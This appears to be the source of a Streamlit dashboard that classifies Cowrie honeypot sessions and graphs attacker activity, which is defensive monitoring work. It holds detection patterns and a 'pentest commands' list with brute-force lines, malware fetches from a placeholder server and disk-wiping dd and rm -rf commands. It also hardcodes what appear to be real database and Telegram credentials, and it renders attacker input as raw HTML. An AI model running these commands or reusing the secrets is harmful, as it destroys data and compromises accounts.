import streamlit as st
import pandas as pd
import psycopg2
from psycopg2.extras import RealDictCursor
import json
import requests
from confluent_kafka import Consumer, KafkaError
from streamlit_autorefresh import st_autorefresh
from pyvis.network import Network
import streamlit.components.v1 as components
import networkx as nx
import tempfile
import os
import re

# --- Configuration ---
DB_HOST = "aws-0-ap-southeast-1.pooler.supabase.com"
DB_NAME = "postgres"
DB_USER = "postgres.ypsdflhceqxrjwyxvclr"
DB_PASS = "Serigala76!"
DB_PORT = 5432

KAFKA_BROKER = "10.0.2.15:9092"
KAFKA_GROUP = "streamlit_consumer_group"
KAFKA_TOPIC = "cowrie_logs"

TELEGRAM_TOKEN = "8083560973:AAGoQstYrKVGVSIincqQ3r_MyGvurDVtNMo"
TELEGRAM_CHAT_ID = "623056896"

# --- Detection Patterns ---
MALWARE_PATTERNS = [
    r"wget\s+(https?|ftp)://",
    r"curl\s+(https?|ftp)://",
    r"\.(sh|bin|exe|py|js)\s*$"
]

WIPER_PATTERNS = [
    r"rm\s+-rf",
    r"dd\s+if=/dev/",
    r":\(\)\{:\|:\&\};:",
    r"mv\s+/dev/null",
    r">\s+/dev/sd[a-z]"
]

RECON_PATTERNS = [
    r"cat\s+/etc/passwd",
    r"uname\s+-a",
    r"whoami",
    r"busybox",
    r"nmap",
    r"ping\s+-t",
    r"ss\s+-tuln"
]

BRUTE_FORCE_THRESHOLD = 5

# --- Attack Color Mapping ---
ATTACK_COLORS = {
    "Brute Force Attack": "#D1ECF1",  # Light blue
    "Destructive Attack (Wiper)": "#FFB6B6",  # Light red
    "Malware Download Attempt": "#FFF3CD",  # Light yellow
    "Reconnaissance / Enumeration": "#E2E3E5",  # Light gray
    "Port Scanning / Connection Attempt": "#D4EDDA",  # Light green
    "Command Injection Attempt": "#F8D7DA",  # Light pink
    "Successful Login": "#D1E7DD",  # Light teal
    "Failed Login": "#F8F9FA"  # Light white
}

# --- Penetration Testing Commands ---
PENTEST_COMMANDS = {
    "Brute Force Attack": [
        "hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>",
        "medusa -h <TARGET_IP> -U users.txt -P passwords.txt -M ssh"
    ],
    "Malware Download Attempt": [
        "wget http://<MALICIOUS_SERVER>/malware.sh -O /tmp/malware.sh",
        "curl -o /tmp/malware.exe http://<MALICIOUS_SERVER>/malware.exe"
    ],
    "Destructive Attack (Wiper)": [
        "rm -rf /important/directory/*",
        "dd if=/dev/zero of=/dev/sda bs=1M"
    ],
    "Reconnaissance / Enumeration": [
        "nmap -sV -T4 <TARGET_IP>",
        "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt"
    ],
    "Port Scanning / Connection Attempt": [
        "nc -zv <TARGET_IP> 1-1000",
        "masscan -p1-1000 <TARGET_IP> --rate=1000"
    ]
}

# --- Optimized Functions ---
@st.cache_resource
def get_connection():
    return psycopg2.connect(
        host=DB_HOST,
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASS,
        port=DB_PORT,
        cursor_factory=RealDictCursor,
        sslmode='require'
    )

@st.cache_data(ttl=60)
def load_data():
    conn = get_connection()
    try:
        with conn.cursor() as cur:
            cur.execute("""
                SELECT *, 
                       COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
                FROM hornet7_data 
                ORDER BY timestamp DESC 
                LIMIT 500
            """)
            rows = cur.fetchall()
            df = pd.DataFrame(rows)
            
            # Apply attack detection
            attack_info = []
            for _, row in df.iterrows():
                attack_info.append(detect_attack_type(row))
            
            df['attack_type'] = [x[0] for x in attack_info]
            df['attack_details'] = [x[1] for x in attack_info]
            
            return df
    finally:
        conn.close()

def detect_attack_type(row):
    eventid = row.get('eventid', '').lower()
    input_cmd = str(row.get('input', '')).lower()
    message = str(row.get('message', '')).lower()
    
    if eventid == 'cowrie.login.failed':
        if int(row.get('attempt_count', 0)) >= BRUTE_FORCE_THRESHOLD:
            return "Brute Force Attack", f"Multiple failed logins ({row.get('attempt_count')} attempts)"
        return "Failed Login", "Single failed login attempt"
    
    elif eventid == 'cowrie.login.success':
        return "Successful Login", "Login successful"
    
    elif eventid == 'cowrie.command.input':
        for pattern in WIPER_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Destructive Attack (Wiper)", f"Wiper command: {input_cmd[:50]}..."
        
        for pattern in MALWARE_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Malware Download Attempt", f"Download attempt: {input_cmd[:50]}..."
        
        for pattern in RECON_PATTERNS:
            if re.search(pattern, input_cmd):
                return "Reconnaissance / Enumeration", f"Recon command: {input_cmd[:50]}..."
        
        return "Command Injection Attempt", input_cmd[:100]
    
    elif eventid == 'cowrie.session.connect':
        return "Port Scanning / Connection Attempt", f"Connection to port {row.get('dst_port')}"
    
    return "Unknown Activity", message[:100]

def build_session_graph(row):
    G = nx.DiGraph()
    src_ip = row.get('src_ip')
    eventid = row.get('eventid')
    dst_port = row.get('dst_port')
    attack_type = row.get('attack_type')
    
    # Node colors based on attack type
    color_map = {
        "Brute Force Attack": "#FF6B6B",
        "Destructive Attack (Wiper)": "#FF0000",
        "Malware Download Attempt": "#FFA500",
        "Reconnaissance / Enumeration": "#ADD8E6",
        "Port Scanning / Connection Attempt": "#90EE90"
    }
    
    if src_ip:
        G.add_node(src_ip, 
                  label=f"Source: {src_ip}",
                  color=color_map.get(attack_type, "lightblue"),
                  shape="box")
    
    if eventid:
        G.add_node(eventid, 
                  label=f"Event: {eventid}",
                  color="#F0F0F0",
                  shape="ellipse")
    
    if dst_port:
        port_node = f"Port {dst_port}"
        G.add_node(port_node, 
                  label=port_node,
                  color="#D8BFD8",
                  shape="diamond")
    
    # Add edges
    if src_ip and eventid:
        G.add_edge(src_ip, eventid, 
                  title=f"Attack: {attack_type}",
                  color=color_map.get(attack_type, "grey"))
    
    if eventid and dst_port:
        G.add_edge(eventid, port_node, 
                  title=f"Target port: {dst_port}",
                  color="#888888")
    
    return G

# --- Dashboard Layout ---
st.set_page_config(
    page_title="GraphPot - Network Session Analysis", 
    layout="wide",
    initial_sidebar_state="expanded"
)
st.title("🛡️ GraphPot - Network Session Analysis")

if st.button("🔄 Refresh"):
    st.rerun()

st.markdown("---")

# Load data with progress indicator
with st.spinner('Loading threat data...'):
    df = load_data()

if not df.empty:
    # --- Summary Metrics ---
    st.subheader("📊 Attack Summary")
    cols = st.columns(4)
    metrics = [
        ("🔒 Brute Force", "Brute Force Attack"),
        ("🐍 Malware Download", "Malware Download Attempt"),
        ("🔥 Wiper Attack", "Destructive Attack (Wiper)"),
        ("🕵️ Reconnaissance", "Reconnaissance / Enumeration")
    ]
    
    for (icon, metric), col in zip(metrics, cols):
        col.metric(icon, (df['attack_type'] == metric).sum())

    st.markdown("---")

    # --- Moving Marquee ---
    top_ips = df['src_ip'].value_counts().head(3).index.tolist()
    top_sessions = df['session'].value_counts().head(3).index.tolist()
    top_events = df['eventid'].value_counts().head(3).index.tolist()

    moving_text = f"Top IPs: {', '.join(top_ips)} | Top Sessions: {', '.join(top_sessions)} | Top Events: {', '.join(top_events)}"
    st.markdown(
        f'<marquee style="font-size: 18px; color: black; background-color: white; padding: 10px;">{moving_text}</marquee>',
        unsafe_allow_html=True
    )

    st.markdown("---")

    # --- Penetration Testing Guide ---
    with st.expander("🔓 Penetration Testing Commands (Click to Expand)"):
        st.write("Use these commands to simulate attacks for testing:")
        
        for attack_type, commands in PENTEST_COMMANDS.items():
            st.markdown(f"**{attack_type}**")
            for cmd in commands:
                st.code(cmd, language='bash')
            st.markdown("---")

    # --- Highlight Table ---
    st.subheader("📋 Latest Captured Sessions")
    
    def highlight_rows(row):
        return ['background-color: ' + ATTACK_COLORS.get(row['attack_type'], '')] * len(row)
    
    attack_filter = st.selectbox("🔍 Filter by Attack Type:", ["All"] + sorted(df['attack_type'].unique()))
    filtered_df = df if attack_filter == "All" else df[df['attack_type'] == attack_filter]
    
    st.dataframe(
        filtered_df[['timestamp', 'src_ip', 'eventid', 'attack_type', 'dst_port']]
        .style.apply(highlight_rows, axis=1),
        use_container_width=True,
        height=400
    )

    st.markdown("---")

    # --- Network Session Mapping ---
    st.subheader("🧠 Network Session Mapping")
    
    selected_session = st.selectbox(
        "Select a Session ID to visualize:",
        options=df['session'].unique()
    )

    if selected_session:
        selected_row = df[df['session'] == selected_session].iloc[0]
        attack_type = selected_row['attack_type']
        bg_color = ATTACK_COLORS.get(attack_type, "#FFFFFF")
        
        with st.spinner('Generating attack graph...'):
            G = build_session_graph(selected_row)
            
            # Configure stable visualization
            net = Network(
                height="700px", 
                width="100%", 
                directed=True, 
                notebook=False,
                cdn_resources="remote"
            )
            
            # Stabilize the graph
            net.force_atlas_2based(
                gravity=-50,
                central_gravity=0.01,
                spring_length=100,
                spring_strength=0.08,
                damping=0.4,
                overlap=0.1
            )
            
            # Add nodes and edges
            net.from_nx(G)
            
            # Save and display
            with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
                net.save_graph(tmp_file.name)
                components.html(
                    open(tmp_file.name, 'r', encoding='utf-8').read(), 
                    height=700,
                    width=None
                )
            os.unlink(tmp_file.name)

        # Session details with colored background
        st.markdown(f"""
        <div style="background-color:{bg_color}; padding:15px; border-radius:10px">
        <h4>Session Details</h4>
        <p><b>Source IP:</b> <code>{selected_row.get('src_ip', 'N/A')}</code></p>
        <p><b>Attack Type:</b> <code>{attack_type}</code></p>
        <p><b>Target Port:</b> <code>{selected_row.get('dst_port', 'N/A')}</code></p>
        <p><b>Timestamp:</b> <code>{selected_row.get('timestamp', 'N/A')}</code></p>
        <p><b>Details:</b> <code>{selected_row.get('attack_details', 'N/A')}</code></p>
        </div>
        """, unsafe_allow_html=True)

else:
    st.warning("⚠️ No data found.")

# Auto-refresh every 2 minutes
st_autorefresh(interval=120000, key="data_refresh")
